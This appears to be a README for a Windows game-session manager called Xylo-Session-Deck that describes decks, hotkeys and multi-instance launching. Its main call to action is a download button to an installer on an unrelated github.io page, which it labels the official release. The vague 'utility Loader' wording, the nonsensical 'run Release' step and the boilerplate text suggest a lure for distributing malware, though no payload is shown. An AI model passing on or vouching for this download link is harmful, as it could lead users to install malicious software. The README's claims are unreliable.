# Xylo‑Session‑Deck
**A Windows‑only game‑session manager that lets you build, switch, and launch multiple gaming decks with a single click.**

---

## 🚀 What is Xylo‑Session‑Deck?

Xylo‑Session‑Deck is a lightweight desktop utility designed exclusively for **Windows 10 and Windows 11**. It helps you:

* **Create “decks”** – collections of game shortcuts, launch arguments, and configuration profiles.
* **Swap between decks** instantly, keeping your favorite games and settings at your fingertips.
* **Launch multiple sessions** of the same game with different utility, accounts, or performance tweaks.
* **Persist profiles** – each deck remembers window layout, audio levels, and peripheral bindings.

Think of it as a “card deck” for your gaming library: draw the right card, and the session appears ready to play.

---

## 📦 Quick Start

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download%20Now-🟦%20Launch%20Installer-blue?style=for-the-badge&logo=windows" alt="Download Xylo‑Session‑Deck"></a>
</div>

1. Click the button above to open the official Release page.
2. Run the installer (signed by *IntersectScholar*).
3. After installation, launch **Xylo‑Session‑Deck** from the Start menu.

---

## 🛠️ Key Features

| Feature | Description |
|---|---|
| **Deck Builder** | Drag‑and‑drop games, add custom launch arguments, and assign icons. |
| **One‑Click Switch** | Switch decks without closing running games; background sessions stay alive. |
| **Profile Snapshots** | Save and restore window positions, GPU settings, and audio mixes per deck. |
| **Hotkey Integration** | Bind global hotkeys to deck actions for lightning‑fast access. |
| **Multi‑Instance Support** | Launch multiple copies of a game with separate config files. |
| **Portable Mode** | Keep the entire deck folder on a USB stick and run on any Windows 10/11 PC. |

---

## 🖥️ System Requirements

| Requirement | Minimum |
|---|---|
| **OS** | Windows 10 (1809) or Windows 11 |
| **Processor** | 1 GHz + dual‑core |
| **Memory** | 2 GB RAM |
| **Storage** | 150 MB free disk space |
| **Graphics** | Any DirectX 11‑compatible GPU (optional for UI effects) |

---

## 🎮 How to Build Your First Deck

1. **Open Xylo‑Session‑Deck** → click **New Deck**.
2. **Add Games** – press **Add Shortcut**, browse to the game’s executable, and optionally add launch parameters (e.g., `-novid -high`).
3. **Configure Profile** – set windowed/full‑screen mode, audio levels, and peripheral mappings.
4. **Assign a Hotkey** – click the key icon and press your desired combination (e.g., `Ctrl + Alt + 1`).
5. **Save** – your deck appears as a tile on the main screen. Click the tile or press the hotkey to launch everything instantly.

---

## 🔧 Advanced Tips

* **Batch‑Launch utility** – add a “utility Loader” shortcut to the same deck and set its launch order.
* **Separate Accounts** – create duplicate entries of the same game with different `-profile` arguments.
* **Performance Switch** – build a “Low‑Spec” deck that disables shaders and reduces resolution for quick sessions on older hardware.
* **Portable Play** – copy the `Xylo-Session-Deck` folder to a USB drive, run `Release`, and your decks travel with you.

---

## 📚 Documentation & Support

* **User Guide** – available from the **Help** menu inside the app.
* **FAQ** – see the *Help* → *FAQ* section for common troubleshooting steps.
* **Issue Tracker** – open a ticket on the GitHub repository if you encounter bugs or have feature requests.

---

## 🤝 Contributing

Contributions are welcome! If you’d like to improve Xylo‑Session‑Deck:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/YourIdea`).
3. Submit a pull request with a clear description of the change.

Please keep contributions **Windows‑only** and follow the existing code style.

---

## 📜 License

Xylo‑Session‑Deck is released under the **MIT License** – see the `LICENSE` file for details.

---

*Developed by **IntersectScholar** – empowering Windows gamers to manage sessions like never before.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```